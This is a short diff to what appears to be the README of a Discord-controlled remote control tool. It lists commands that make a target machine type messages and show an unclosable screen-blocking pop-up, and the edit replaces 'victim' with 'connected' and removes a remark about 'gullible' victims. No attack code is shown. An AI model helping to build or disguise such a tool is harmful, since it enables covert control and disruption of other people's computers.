@@ -1,6 +1,6 @@
 Here is all the commands
 
-.type<message> - make the victim type anything
+.type<message> - make the connected type anything
 
 .bsod - makes a unclosable pop up that says blocks everything(.bsodn to stop)
 
@@ -18,7 +18,6 @@ Here is all the commands
 
 Here is the requirements
 
-(if you have a REALLY gullible victim then)
 
 pip install discord.py
 
